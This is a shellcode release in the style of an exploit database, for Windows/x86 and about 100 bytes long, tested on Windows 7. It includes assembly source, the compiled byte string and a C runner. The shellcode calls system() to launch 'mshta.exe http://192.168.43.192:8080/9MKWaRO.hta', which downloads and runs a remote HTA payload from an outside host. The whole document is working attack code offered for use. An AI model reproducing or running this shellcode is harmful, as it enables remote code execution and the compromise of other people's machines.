# Shellcode Title: Windows/x86 Download using mshta.exe Shellcode (100 bytes)
# Shellcode Author: Siddharth Sharma
# Shellcode Length: ~100 bytes
# Tested on: WIN7x86
# Date: 2020-06-16

/*

#Description
# Simply, instead of using mshta.exe to download file as:
mshta.exe http://<IP>:<port>/<file_name.hta> ,
# We could use below shellcode that does the same.



=============================
xor eax, eax              ;clear eax,get msvcrt.dll
mov ax, 0x7472             ;"tr\0\0"
push eax
push dword 0x6376736d 	   ;cvsm
push esp


mov ebx,0x77e3395c         ;call LoadLibraryA
call ebx
mov ebp,eax		    ;msvcrt.dll is saved in ebp


;mshta.exe http://192.168.43.192:8080/9MKWaRO.hta
xor eax,eax
PUSH eax
PUSH 0x6174682e         ;".hta"
PUSH 0x4f526157		;"WaRO"
PUSH 0x4b4d392f		;"/9MK"
PUSH 0x38303830		;"8080"
PUSH 0x3a323931		;"192:"
PUSH 0x2e33342e		;".43."
PUSH 0x3836312e		;".168"
PUSH 0x3239312f		;"/192"
PUSH 0x2f3a7074		;"tp:/"
PUSH 0x74682065		;"e ht"
PUSH 0x78652e61		;"a.ex"
PUSH 0x7468736d		;"msht"



MOV EDI,ESP          ;adding a pointer to the stack
PUSH EDI


Mov eax,0x6ffab16f	    ;call System
call eax

xor eax, eax
push eax
mov eax, 0x77e3214f         ;call ExitProcess
call eax
=====================================
*/


char code[] = "\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x5c\x39\xe3\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x2e\x68\x74\x61\x68\x57\x61\x52\x4f\x68\x2f\x39\x4d\x4b\x68\x30\x38\x30\x38\x68\x31\x39\x32\x3a\x68\x2e\x34\x33\x2e\x68\x2e\x31\x36\x38\x68\x2f\x31\x39\x32\x68\x74\x70\x3a\x2f\x68\x65\x20\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68\x74\x89\xe7\x57\xb8\x6f\xb1\xfa\x6f\xff\xd0\x31\xc0\x50\xb8\x4f\x21\xe3\x77\xff\xd0";

int main(int argc, char **argv)
{
	int(*func)();
	func = (int(*)()) code;
	(int)(*func)();
}